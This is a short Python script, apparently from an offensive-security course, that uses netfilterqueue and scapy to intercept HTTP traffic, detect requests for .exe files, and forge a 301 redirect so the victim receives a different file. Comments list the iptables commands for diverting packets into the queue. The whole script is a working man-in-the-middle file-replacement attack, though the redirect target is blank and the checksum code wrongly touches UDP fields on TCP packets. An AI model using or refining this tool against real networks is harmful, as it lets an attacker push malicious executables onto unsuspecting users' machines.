#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy

# usable ONLY with HTTP connections
# service apache2 start - START BUILT IN WEB SERVER
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables --flush

ack_list = []


def set_load(packet, load):
    packet[scapy.Raw].load = load

    # remove chksum & len to maintain packet integrity (will be recalculated automatically by scapy)
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.UDP].chksum
    del packet[scapy.UDP].len

    return packet


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            # print("HTTP Request")
            # check if request contains an .exe file (most likely a download)
            if ".exe" in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                # saves the ack of all requests in scope in the list
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            # print("HTTP Response")
            # check if the response is related to any request in scope
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replacing file")
                replaced_location = "\n\n"

                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + replaced_location)

                packet.set_payload(str(modified_packet))
    packet.accept()


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()